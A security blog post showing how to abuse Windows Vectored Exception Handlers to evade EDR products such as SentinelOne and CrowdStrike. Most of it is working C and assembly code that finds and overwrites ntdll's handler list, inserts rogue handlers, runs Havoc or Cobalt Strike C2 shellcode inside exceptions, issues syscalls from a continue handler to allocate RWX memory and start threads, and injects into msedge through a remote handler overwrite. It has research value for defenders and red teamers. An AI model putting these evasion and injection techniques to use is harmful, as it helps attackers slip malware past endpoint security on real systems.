# https://mannyfreddy.gitbook.io/ya-boy-manny

## [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#fun-with-exception-handlers)    Fun with Exception Handlers

Intro:

This small blog post discusses and demonstrates various VEH related abuse primitives, and how these can be used against EDRs employing VEH hooks.

This blog IS NOT a direct attack against SentinelOne/CrowdStrike even though it might seem like one. Rather it showcases different reasons why VEH hooking should not be considered a "silver-bullet", and how using VEH hooks to gather various telemetry can backfire instead.

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#basics)    Basics

Vectored Exception Handling is a built-in Windows mechanism that allows an application to catch and handle exceptions with a custom handler function before `SEH` is called. `VEH`s are global to an application, unlike `SEH` that is coupled with a thread's stack.

When an exception occurs in usermode, the program quickly transitions to ring-0 and then back to ring-3, eventually calling `RtlpCallVectoredHandlers`. `RtlpCallVectoredHandlers` will check if there are any entries in the `Exception Handler` list, and if there are, will start parsing the linked list, calling each handler function until one returns `EXCEPTION_CONTINUE_EXECUTION`. If a registered `VEH` returns `EXCEPTION_CONTINUE_EXECUTION`, `RtlpCallVectoredHandlers` will parse the `Continue Handler` list and call each registered `VCH` next.

Copy

```
struct _VECTORED_HANDLER_LIST {
    PVOID               MutexException;
    PVEH_HANDLER_ENTRY  FirstExceptionHandler;   // Start of VEH list
    PVEH_HANDLER_ENTRY  LastExceptionHandler;
    PVOID               MutexContinue;
    PVEH_HANDLER_ENTRY  FirstContinueHandler;    // Start of VCH list
    PVEH_HANDLER_ENTRY  LastContinueHandler;
}
```

#### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#exception-handler-list-location)    **Exception Handler List Location**

The handler list itself is located at an static offset from the base address of ntdll:

- Win10: ntdll + 0x1813f0

- Win11: ntdll + 0x199400


![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FpW8lCByo3TBh6pS3pxr2%252Fveh-list.png%3Falt%3Dmedia%26token%3D7d8f7463-7a91-4a32-a26b-2c28467bced5&width=768&dpr=3&quality=100&sign=e8587b02&sv=2)

_Win10 offset_

Considering the differences in offsets between Windows 10 and 11, we can search for a specific common instruction using the following function:

Copy

```
PVOID HandlerList() {

   PBYTE   pNext = NULL;
   PBYTE   pRtlpAddVectoredHandler = NULL;
   PBYTE   pVehList = NULL;
   int     offset = 0;
   int     i = 1;

   PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlAddVectoredExceptionHandler");
   printf("[*] RtlAddVectoredExceptionHandler: 0x%p\n", pRtlAddVectoredExceptionHandler);

   //RtlpAddVectoredHandler is always 0x10 away
   pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;
   printf("[*] RtlpAddVectoredHandler: 0x%p\n", pRtlpAddVectoredHandler);

   while (TRUE) {

       if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {

           if (i == 2) {
               offset = *(int*)(pRtlpAddVectoredHandler + 3);
               pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
               pVehList = pNext + offset;
               return pVehList;
           }
           else {
               i++;
           }
       }

       pRtlpAddVectoredHandler++;
   }

   return NULL;
}
```

_Searches for the second "lea rcx ntdll!..." instruction and gets the list location from it_

#### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#handler-entries-and-encoded-pointers)    **Handler Entries & Encoded Pointers**

Each entry is located on the heap. The main member we are after is `VectoredHandler`, but others will also be used accordingly when needed.

Copy

```
struct _VEH_HANDLER_ENTRY {
    LIST_ENTRY  Entry;            //Pointers to next/previous entries
    PVOID       SyncRefs;         //Reference counting for internal API-s
    PVOID       Rnd;              //Doesn't seem to get used
    PVOID       VectoredHandler;  //Encoded pointer to actual function
};
```

The pointers to the actual handler functions registered, be it a `VEH` or a `VCH`, are encoded using a process cookie in combination with `ROL`.

API-s that are used and their respective lower level calls are as follows:

`EncodePointer` -\> `RtlEncodePointer` -\> `NtQueryInformationProcess` \+ ROL

`DecodePointer` -\> `RtlDecodePointer` -\> `NtQueryInformationProcess` \+ ROR

`EncodeRemotePointer` -\> `RtlEncodeRemotePointer` -\> `NtQueryInformationProcess` \+ ROL

`DecodeRemotePointer` -\> `RtlDecodeRemotePointer` -\> `NtQueryInformationProcess` \+ ROR

Since `NtQueryInformationProcess` gets called everytime, it is also possible to manually encode/decode pointers:

Copy

```
PVOID DecodePointers(PVOID pointer, DWORD cookie) {
    return (PVOID)RotateRight64((ULONG_PTR)pointer, 0x40 - (cookie & 0x3f)) ^ cookie);
}

PVOID EncodePointers(PVOID pointer, DWORD cookie) {
    return (PVOID)RotateLeft64((ULONG_PTR)pointer ^ cookie, 0x40 - (cookie & 0x3f)));
}
...
...
DWORD cookie;
ULONG ret;
NtQueryInformationProcess(hHandle, 0x24, &cookie, sizeof(cookie), &ret);
```

* * *

## [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#abusing-an-already-present-veh)    Abusing an already present VEH

With the basic info out of the way, we can start abusing VEHs.

All of the following abuse techniques were tested with SentinelOne and rely on the fact that a VEH has already been registered in our process. When dealing with CrowdStrike, it is important to modify the overall exception handling (dealing with HWBPs, multiple VEHs etc). For debugging and playing around, just register an empty function as a handler.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FJajRMzmhZqX868w4vmBZ%252Fimage-1.png%3Falt%3Dmedia%26token%3Dc3371b46-7959-4014-aaab-c524a80a11ca&width=768&dpr=3&quality=100&sign=cfcf28ec&sv=2)

_Regular notepad with a VEH hook_

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#free-veh-anyone)    **Free VEH anyone?**

One of the easiest, and most powerful things to do is the "hijacking" of a VEH - By simply replacing the pointer to the actual handler function with a pointer to our own function, we can "handle" exceptions ourselves.

We can then easily:

- Ignore guard page violations

- Manually trigger exceptions and install HWBPs

- Handle HWBPs

- Do vectored sycalls


First off, we need to define our VEH function itself. We won't be tripping any guard pages for now, but we can manually trigger an exception and then handle it from our new VEH as a demonstration.

Copy

```
LONG NTAPI VehhyBoy(EXCEPTION_POINTERS* Info) {

    printf("[+] Caught exception: 0x%0.8X\n", Info->ExceptionRecord->ExceptionCode);

    if (Info->ExceptionRecord->ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO) {
        Info->ContextRecord->Rip += 2;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
```

The overall logic of our OverWrite function is straight forward:

- Get the handler list location

- Copy the handler list contents

- Overwrite the existing pointer in the first registered `VEH`


Copy

```
struct _VEH_HANDLER_ENTRY {
    LIST_ENTRY  Entry;
    PVOID       SyncRefs;
    PVOID       Rnd;
    PVOID       VectoredHandler;   //We are overwriting this
};

void OverWrite() {

    VECTORED_HANDLER_LIST   handler_list = { 0 };
    PVOID                   pHandlerList = HandlerList();

    memcpy(&handler_list, pHandlerList, sizeof(VECTORED_HANDLER_LIST));

    PVOID pointer = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler);
    *(PVOID*)pointer = EncodePointer(VehhyBoy); //replace original pointer

    return;
}
```

We can verify that the pointer to the actual handler function was changed, and that our manually initiated exception was successfully handled.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FzWzzwldUMdvRqL6dWHch%252Fimage-2.png%3Falt%3Dmedia%26token%3Dc47866a8-d419-47cb-90d2-a6af7a84da43&width=768&dpr=3&quality=100&sign=20f6f479&sv=2)

_VEH-Verifier just parses the VEH list_

Since we overwrote the first `VEH`, we can basically do anything we want with exceptions. We in theory could even feed the EDR fake info by modifying register values and returning `EXCEPTION_CONTINUE_SEARCH` (when there are other EDR VEHs behind us). It is also possible to edit the `FirstExceptionHandler` in ntdll, but there are some caveats to this that will be shortly talked about in the end.

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#exceptional-local-exec)    **Exceptional Local Exec**

For smaller payloads, we can simply make the handler function point to our shellcode instead. The only problem with this is that since we are running shellcode in an exception, we would need to handle the specific exception accordingly if we wanted to continue normal execution afterwards. There's also the likely possibilty of causing another exception while IN an exception, which would simply mean that `RtlpCallVectoredHandlers` would try to execute our "handler" again.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FKz4ipu3If4CIeAxeFosD%252Fs1-calc.gif%3Falt%3Dmedia%26token%3D26e40003-1e88-43e9-9e6f-2fe2ff3ba176&width=768&dpr=3&quality=100&sign=71641c69&sv=2)

**Manual Addition**

Structs related to added `VEH`s are stored on the heap. This simply means that we have the privilege of adding our own handler into the list by allocating our own `VEH_HANDLER_ENTRY` struct and modifying the Flink/Blinks of an existing entry.

First we allocate the struct on the heap:

Copy

```
VEH_HANDLER_ENTRY* new_entry = (VEH_HANDLER_ENTRY*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VEH_HANDLER_ENTRY));
```

Then update the members of our new entry:

Copy

```
new_entry->Entry.Flink = (ULONG_PTR)pHandlerList + 8;                         //Our new entry is last, needs to point to the start of the list
new_entry->Entry.Blink = handler_list.FirstExceptionHandler;                 //Point to the previous (first) entry
new_entry->SyncRef = (ULONG_PTR)handler_list.FirstExceptionHandler + 0x10;  //Copy value from existing entry
new_entry->VectoredHandler = EncodePointer(VehhyBoy);                      //Encode pointer to our function
```

It is important to copy the `SyncRef` from an existing entry (or just provide a pointer to your own int). This value gets used later on for synchronization/reference counting (`SyncRef` gets loaded into `RAX`):

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FcH9VCLE97bGKnHB6BxOq%252Fidfk-tbh.png%3Falt%3Dmedia%26token%3Dabed1177-dae8-4184-94f2-ac3710d9fabb&width=768&dpr=3&quality=100&sign=dda731c&sv=2)

And finally we need to modify the Flink of the existing entry so it points to our struct instead of the list start:

Copy

```
*(PVOID*)handler_list.FirstExceptionHandler = new_entry; //first member of VEH_HANDLER_ENTRY is a LIST_ENTRY, Flink is the first member of LIST_ENTRY (offset = 0)
```

We can see our manually added VEH in the list, and like before, we handle the exception accordingly.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FJbbqWj8z1swpZYcVCAIg%252Fimage-3.png%3Falt%3Dmedia%26token%3Da3aa8394-b207-4bf0-ae15-c56b294fc826&width=768&dpr=3&quality=100&sign=501b1e55&sv=2)

This demonstrates that even if an EDR, let's say, adds integrity checks for its `VEH` function pointers, we can silently add our own VEH into the list. One obvious downside is that the VEH registered by an EDR is located in front of our `VEH`, and can therefore check register values before passing it on to our VEH (it might even handle some exceptions, so it is important to choose what sort of exceptions to trigger for `HWBP` installation etc).

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#combining-the-pieces)    **Combining the pieces**

If we do not want to unhook the hooking dll/modify our C2, we need to combine the techniques together to successfully pop a C2 payload. We will modify our `VEH` function so we can ignore `GUARD_PAGE` exceptions and do vectored syscalls by causing an `ACCESS_VIOLATION`.

Copy

```
LONG NTAPI VehhyBoy(EXCEPTION_POINTERS* Info) {

    printf("[+] Caught exception: 0x%0.8X\n", Info->ExceptionRecord->ExceptionCode);

    if (Info->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (Info->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {

        Info->ContextRecord->Rax = Info->ContextRecord->Rip;
        Info->ContextRecord->Rip = Info->ContextRecord->R11;
        Info->ContextRecord->R10 = Info->ContextRecord->Rcx;
        Info->ContextRecord->R11 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
```

It should be clearly noted that the first `VEH` needs to handle every exception that is caused:

- By the hooking dll

- By us doing vectored syscalls


The second "VEH", that we will manually add, will point to our C2 shellcode instead. We should only reach there once by causing an exception the first `VEH` will not handle.

Here's a flowchart to better visualize this:

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FDkMqwo1BVqnUVX3Zf81Z%252Fveh-wombocombo.png%3Falt%3Dmedia%26token%3Dc53bfc82-3d9c-4c94-a073-c1d418b97f39&width=768&dpr=3&quality=100&sign=66874e0f&sv=2)

Now when we trigger an `INT_DIVIDE_BY_ZERO`, the first VEH will not handle it. When `RtlpCallVectoredHandlers` parses the linked list and calls our second "VEH" to check if it's programmed to handle the exception, it will execute our C2 shellcode instead.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252F8USQJiKTs93IYJEfUb4m%252Fs1-1.gif%3Falt%3Dmedia%26token%3Df5536464-80d1-4d8c-b463-d81b531a0009&width=768&dpr=3&quality=100&sign=1c67e418&sv=2)

Now running in an exception, the first VEH will handle all `GUARD_PAGE` exceptions by returning `EXCEPTION_CONTINUE_EXECUTION` \- this is critical, as executing our second VEH again would be fatal.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FE0Lw9ap0OB5fcIoUBHUg%252Fs1-2.gif%3Falt%3Dmedia%26token%3Dfbf64f84-8674-49fb-9809-88b7fc753fa2&width=768&dpr=3&quality=100&sign=a3c9c306&sv=2)

The binary in the video is just a less shitty private version of the certified hood classic [SentinelBruharrow-up-right](https://github.com/mannyfred/SentinelBruh) with some modifications. _Pretty much default Havoc was used._

It should be also noted that the payloads should be tested thoroughly before executing them in an exception. When shellcode is ran in an exception, the stack would be something like this:

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252F9TaYcWoUrjyb4yIUb8Zt%252Fstack1.png%3Falt%3Dmedia%26token%3D013d7837-a4fe-4f05-82cb-c30d0e3f99df&width=768&dpr=3&quality=100&sign=8ba8020f&sv=2)

However if you are using stack spoof or similar with CobaltStrike, your stack could look like this: (this is after overwriting the FIRST VEH function pointer and causing an exception):

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FYJDmpOIKH46a3ucn40hj%252Fcobalt-stack2.png%3Falt%3Dmedia%26token%3D6a07af77-efa1-409b-b0ad-c3303587b6a8&width=768&dpr=3&quality=100&sign=9c6f257c&sv=2)

(Obviously different configuration will play a big role, this is just an example what could happen)

This is the stack after overwriting the SECOND VEH function pointer (with the same config):

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FgXiwDkGBzIbhb3baXdQM%252Fcobalt-stack-1.png%3Falt%3Dmedia%26token%3D27e29170-404a-424d-b775-3219c6d093aa&width=768&dpr=3&quality=100&sign=830e3baf&sv=2)

Stack after executing a demon payload as can be seen in the video:

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FOHUEfoizdhxO3zcC33qD%252Fhavoc-stack.png%3Falt%3Dmedia%26token%3Dab2299cb-a13c-4365-9c7d-60dd4b91cda6&width=768&dpr=3&quality=100&sign=2680bd5f&sv=2)

(Ekko using "jmp rbx" and stack duplication)

The biggest drawback of running a C2 agent in an exception is the stability - `inline-ExecuteAssembly`/`dotnet inline-execute` can easily crash your beacon/demon. Same thing can happen when executing BOFs.

When I did CRTL, I only used stageless runners based on the VEH overwrite abuse primitive (I hated that webproxy). The biggest downside to it was that with my config I couldn't inline execute C# tooling, as that would've simply killed my beacon. However, running a beacon in an exception seemed to have its benefits - I was able to use `execute-assembly`, `inject` etc without ever needing an inject kit.

#### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#ghetto-syscalls)    Ghetto Syscalls

One additional thing to note about Vectored Exception Handling is the possibilty of registering "callbacks".

When a Vectored EXCEPTION Handler is set up, it is also possible to register a Vectored CONTINUE Handler. `VCH` is somewhat similar to a `VEH` \- Function prototypes are identical and we have the privilege of updating our `CONTEXT`. The only difference is that all VCHs are called by `RtlpCallVectoredHandlers` AFTER a `VEH` has returned `EXCEPTION_CONTINUE_EXECUTION` (`RtlpCallVectoredHandlers` returned TRUE).

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FpwieeC4S2WDAUyyoS9x5%252Fsecond-api-call.png%3Falt%3Dmedia%26token%3D8c873e93-3124-4c16-b062-39e9a2eff3de&width=768&dpr=3&quality=100&sign=74a7c215&sv=2)

When `RtlpCallVectoredHandlers` is called again, this time with the value of `1` in `RBX`, `RAX` and `R8`, we can see it indirectly reference the VCH list:

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FHNK6BTWrLRMeMqQMmHUO%252Findirect-VCH-access.png%3Falt%3Dmedia%26token%3D44de0664-d2db-4b01-a4b0-4a999ffab5e6&width=768&dpr=3&quality=100&sign=6233eb24&sv=2)

For reference:

Copy

```
struct _VECTORED_HANDLER_LIST {
    PVOID               MutexException;
    PVEH_HANDLER_ENTRY  FirstExceptionHandler;   // 8
    PVEH_HANDLER_ENTRY  LastExceptionHandler;
    PVOID               MutexContinue;
    PVEH_HANDLER_ENTRY  FirstContinueHandler;    // 32
    PVEH_HANDLER_ENTRY  LastContinueHandler;
}
```

* * *

We can define our continue handler like so:

Copy

```
LONG NTAPI ContinueBoy(EXCEPTION_POINTERS* Info) {
    printf("[+] Caught exception (VCH): 0x%0.8X\n", Info->ExceptionRecord->ExceptionCode);
}
```

And then register it:

Copy

```
PVOID vch = AddVectoredContinueHandler(1, ContinueBoy);
```

We can safely use `AddVectoredContinueHandler` since unlike `AddVectoredExceptionHandler`, it isn't hooked. By default, both `RtlAddVectoredExceptionHandler` and `RtlAddVectoredContinueHandler` simply execute a single instruction and then `jmp` to `RtlpAddVectoredHandler`.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FF83UY8Y5sohtg0XSgpF1%252Fno-hook.png%3Falt%3Dmedia%26token%3De6bd570f-d3e6-442d-b5b5-9fb1a17c0025&width=768&dpr=3&quality=100&sign=9428b47e&sv=2)

We can quickly confirm our VCH function is getting called by trying to execute some `Havoc` shellcode.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FjhF8Z2SIEI5v3WHkZ53O%252FVCH-callback.png%3Falt%3Dmedia%26token%3Dea58d2c5-d9f5-4447-88d0-b5d49e1c8adf&width=768&dpr=3&quality=100&sign=d6e31f50&sv=2)

Given the fact that a `GUARD_PAGE` exception is only thrown on some specific memory access, it can be challenging, or more like impossible to get all the parameters needed for a syscall passed to us within registers/stack. Because of this, all of the needed parameters are thrown onto the heap and accessed via global pointer. A simple global counter is also used to determine if we need to update the registers/stack, and if so, with what parameters.

This updated ghetto `VCH` will simply allocate `RWX` memory with `NtAllocateVirtualMemory` and create a thread using `NtCreateThreadEx`.

Copy

```
LONG NTAPI ContinueBoy(EXCEPTION_POINTERS* Info) {

    printf("[+] Caught exception (VCH): 0x%0.8X\n", Info->ExceptionRecord->ExceptionCode);

    PVOID* ptr = (PVOID*)(Info->ContextRecord->Rsp + 0x28);

    if (count == 1) {

        printf("[+] I am the one who uses RWX ...\n");
        Info->ContextRecord->Rcx = memparams->ProcessHandle;
        Info->ContextRecord->Rdx = &memparams->BaseAddr;
        Info->ContextRecord->R8 = memparams->ZeroBits;
        Info->ContextRecord->R9 = &memparams->RegionSize;

        ptr[0] = memparams->AllocationType;
        ptr[1] = memparams->Protect;

        Info->ContextRecord->Rip = g_Nt.NtAllocateVirtualMemory.pSyscallAddress;
        Info->ContextRecord->Rax = g_Nt.NtAllocateVirtualMemory.dwSsn;
        Info->ContextRecord->R10 = Info->ContextRecord->Rcx;
    }

    if (count == 2) {

        printf("[+] Creating Thread ...\n");
        Info->ContextRecord->Rcx = threadparams->ThreadHandle;
        Info->ContextRecord->Rdx = threadparams->DesiredAccess;
        Info->ContextRecord->R8 = threadparams->ObjAttributes;
        Info->ContextRecord->R9 = threadparams->ProcessHandle;

        ptr[0] = threadparams->StartRoutine;
        ptr[1] = threadparams->Argument;
        ptr[2] = threadparams->CreationFlags;
        ptr[3] = threadparams->ZeroBits;
        ptr[4] = threadparams->StackSize;
        ptr[5] = threadparams->MaxStackSize;
        ptr[6] = threadparams->Attributes;

        Info->ContextRecord->Rip = g_Nt.NtCreateThreadEx.pSyscallAddress;
        Info->ContextRecord->Rax = g_Nt.NtCreateThreadEx.dwSsn;
        Info->ContextRecord->R10 = Info->ContextRecord->Rcx;
    }

    count++;
}
```

_This is obviously shitpost tier code, please don't do something like this unironically_

Now when triggering a `GUARD_PAGE` exception on purpose, our `VCH` gets called. It is important to tease the EDR just enough but at the same time not too much so we don't get nuked.

The EDR's `VEH` will go over all of our stuff and return `EXCEPTION_CONTINUE_EXECUTION` as it didn't find anything suspicious enough. However, little does the EDR know that it just handed us the privilege of modifying the `CONTEXT` of our thread in a `VCH`.

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252FPZ6rvXiFkQUUelLqJL3m%252Fs1-3.gif%3Falt%3Dmedia%26token%3D29df9469-bc3c-4fae-821f-9f7122162f29&width=768&dpr=3&quality=100&sign=af9920cc&sv=2)

_In this video, PEB and Havoc were slightly modified as to not trip any additional page guards_

So if you have some ultra suspicious syscall to make, you can manually trigger an exception an EDR's `VEH` checks for and then just hope it returns `EXCEPTION_CONTINUE_EXECUTION`.

After you are done, remove the continue handler and _continue_ like nothing happened.

Copy

```
RemoveVectoredContinueHandler(vch);
```

* * *

## [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#process-injection-vehxpool)    Process Injection - VEHxPool

The following is a small sample from one of my disbanded projects called VEHxPool. The whole idea of VEHxPool was to target `msedge` (since it registers a `VEH` by default), and to combine the `VEH` overwrite abuse primitive with various `PoolParty` related process injection techniques.

Both of these examples are rather "cursed" - After doing mapping, the region is clearly visible, but after stealing a worker thread with the help of an exception, the region simply disappears and a new suspicious private region appears in our target instead.

This only gets annoying when you need to make use of your allocated `VEH` later on, but this can be easily fixed by allocating separate memory only meant for the `VEH`.

### [hashtag](https://mannyfreddy.gitbook.io/ya-boy-manny\#dubious-completion-i-o-ports)    **Dubious Completion - I/O Ports**

We start off by getting all of the open handles on the system, and then duplicating the first `IoCompletion` handle belonging to our target `msedge` instance. We can quickly filter by `ObjectTypeIndex` and `UniqueProcessId`:

Copy

```
for (int i = 0; i < pHandleList->NumberOfHandles; i++) {

    if ((pHandleList->Handles[i].ObjectTypeIndex != IO_INDEX) || (pHandleList->Handles[i].UniqueProcessId != dwTarget)) {
        continue;
    }

    NtDuplicateObject(hTarget, (HANDLE)pHandleList->Handles[i].HandleValue, NtCurrentProcess(), &hTmpHandle, 0, 0, DUPLICATE_SAME_ACCESS);

    *hDupHandle = hTmpHandle; break;
}
```

_Most ObjectTypeIndex values depend on Windows version_

After we have successfully duped the handle, we can do some mapping. The shellcode we throw into mapped memory should hold both the VEH function and C2 payload for now:

![](https://mannyfreddy.gitbook.io/ya-boy-manny/~gitbook/image?url=https%3A%2F%2F3559698096-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FkVz9K1QrbQd8LToDmp4i%252Fuploads%252F6caKBDzmJDNpd1nhBIkT%252Fmap-edge.png%3Falt%3Dmedia%26token%3D28bfa550-2966-4d20-bfc2-cdd26dc72e63&width=768&dpr=3&quality=100&sign=a6882a57&sv=2)

We can use the following VEH function for now:

Copy

```
mov rax, qword ptr [rcx]
mov edx, dword ptr [rax]        ; exception code
cmp edx, 0xC0000005
jne 0x28
mov rax, qword ptr [rcx+8]
movabs rcx, 0x123456789abc      ; placeholder address
mov qword ptr [rdx+0xF8], rcx   ; if ACCESS_VIOLATION redirect to C2 shellcode
mov eax, 0xffffffff             ; EXCEPTION_CONTINUE_EXECUTION
ret
xor eax, eax
cmp edx, 0x80000001             ; For S1 (later on)
setne al
dec eax
ret
int 3
...     ; pad until a nice size (0x40 for now)
```

Mapping was chosen as we can then easily update our placeholder address in memory.

Copy

```
PVOID place_holder = (ULONG_PTR)pAddrLocal + 0x13;
*(PVOID*)place_holder = (ULONG_PTR)pAddrRemote + 0x40;
```

After our initial setup, we can overwrite the `VEH` in `msedge`:

Copy

```
BOOL OverWriteRemoteVEH(HANDLE hTarget, PVOID pRemoteMap) {

    DWORD                   dwCookie;
    DWORD                   dwOld;
    VECTORED_HANDLER_LIST   handler_list = { 0 };
    VEH_HANDLER_ENTRY       handler_entry = { 0 };

    PVOID pHandlerList = HandlerList();

    NtReadVirtualMemory(hTarget, pHandlerList, &handler_list, sizeof(VECTORED_HANDLER_LIST), NULL);
    NtReadVirtualMemory(hTarget, handler_list.FirstExceptionHandler, &handler_entry, sizeof(VEH_HANDLER_ENTRY), NULL);

    Cookie(hTarget, &dwCookie);

    handler_entry.VectoredHandler = EncodePointers(pRemoteMap, dwCookie);
    PVOID pointer = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler);

    VirtualProtectEx(hTarget, pointer, sizeof(PVOID), PAGE_READWRITE, &dwOld);
    NtWriteVirtualMemory(hTarget, pointer, &handler_entry.VectoredHandler, sizeof(PVOID), NULL);
    VirtualProtectEx(hTarget, pointer, sizeof(PVOID), dwOld, &dwOld);

    return TRUE;
}
```

Now the only thing left is to actually use our duped handle.

Instead of allocating a `TP_DIRECT` struct in our target, setting its `Callback` member to our C2 payload location and sending a pointer to said struct, we can instead send an arbitrary address pointing towards, for example, some function in ntdll.

Copy

```
NtSetIoCompletion(hDupHandle, pRndFncAddr, NULL, NULL, NULL);
```

Now when we send the completion packet, an EDR will only see addresses backed to disk/random values (if they even check them). When a worker thread starts to deal with our "packet", it will instead throw an exception, causing the execution flow to be redirected to our C2 shellcode.

This method overall is rather unreliable, it seems to require setting up somewhat specific delays and hitting timings. Didn't test this against S1, but here's the memory stuff I mentioned earlier:

